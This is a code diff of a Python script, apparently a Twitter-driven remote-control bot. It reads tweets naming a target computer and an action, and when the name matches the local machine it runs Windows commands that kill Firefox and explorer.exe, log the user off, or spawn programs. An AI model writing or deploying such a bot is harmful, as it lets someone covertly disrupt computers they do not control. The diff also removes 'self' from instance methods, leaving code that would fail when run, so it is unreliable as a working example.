@@ -7,44 +7,44 @@
 import requests
 import re
 import time
+import os
 
 class WindowsCmds():
     '''
         Executing Windows commands.
     '''
-    def __init__(self):
-        import os
+    def __init__():
         import subprocess
 
-    def killFirefox(self):
+    def killFirefox():
         '''
             Params: None
             Purpose: Kill Firefox.
         '''
         os.system('taskkill /f /im firefox.exe')
 
-    def killExplorer(self):
+    def killExplorer():
         '''
             Params: None
             Purpose: Kill explorer.exe 
         '''
         os.system('taskkill /f /im explorer.exe')
 
-    def logOff(self):
+    def logOff():
         '''
             Params: None
             Purpose: Logoff user
         '''
         os.system('shutdown /l')
 
-    def magnify(self):
+    def magnify():
         '''
             Params: None
             Purpose: Spawn magnify
         '''
         os.system('magnify.exe')
 
-    def calcMe(self):
+    def calcMe():
         '''
             Params: None
             Purpose: Death by calc. Bo would approve.
@@ -123,7 +123,7 @@ class TweetScrape():
         elif command  == "YuanSpawn":
             winexe.calcMe()
         else:
-            print("woops")
+            time.sleep(3)
 
     def split_tweet(self, dottedTweet):
         '''
@@ -137,10 +137,10 @@ class TweetScrape():
         name = os.environ['COMPUTERNAME']
         machine = dottedTweet.split(".")[1]
         action = dottedTweet.split(".")[2]
-        #print("Action: " + str(action) + " applied to machine " + str(machine)) #Debugging
+        print("Action: " + str(action) + " applied to machine " + str(machine)) #Debugging
 
         if machine == name: #If the tweet is directed at the machine, execute. 
-            windows_cmdExcution(action, machine) 
+            self.windows_cmdExcution(action) 
 
 if __name__ == "__main__":
 
